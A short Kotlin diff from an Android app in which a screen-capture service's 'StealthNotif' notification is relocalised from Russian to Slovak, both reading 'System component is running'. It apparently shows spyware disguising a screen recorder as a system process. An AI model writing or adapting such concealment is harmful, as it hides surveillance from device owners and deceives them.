@@ -193,7 +193,7 @@ class ScreenCapture : Service() {
 
     private fun buildNotification(): Notification {
         return com.sp.core.util.StealthNotif.build(
-            this, "android_UI", "Системный компонент работает"
+            this, "android_UI", "Systémová komponenta beží"
         )
     }
 
